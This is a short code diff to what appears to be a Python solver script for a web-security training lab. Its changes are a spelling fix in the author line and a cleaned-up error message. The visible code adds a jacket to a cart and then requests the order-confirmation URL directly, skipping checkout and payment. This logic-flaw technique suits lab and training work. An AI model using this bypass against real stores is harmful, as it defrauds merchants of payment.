@@ -1,6 +1,6 @@
 ########################################################################
 #
-# Author: Ahmed Elqalawy (@elqal3awii)
+# Author: Ahmed Elqalaawy (@elqal3awii)
 #
 # Date: 27/10/2023
 #
@@ -97,10 +97,10 @@ print(Fore.WHITE + "⦗4⦘ Adding the leather jacket to the cart.. " + Fore.GRE
 
 try:  
     # confirm order directly without checking out
-    wiener = requests.get(f"{url}/cart/order-confirmation?order-confirmed=true", cookies=cookies)
+    requests.get(f"{url}/cart/order-confirmation?order-confirmed=true", cookies=cookies)
     
 except:
-    print(Fore.RED + "[!] Failed to fetch wiener's cart through exception")
+    print(Fore.RED + "[!] Failed to confirm order through exception")
     exit(1)
 
 print(Fore.WHITE + "⦗5⦘ Confirming order directly without checking out.. " + Fore.GREEN + "OK")
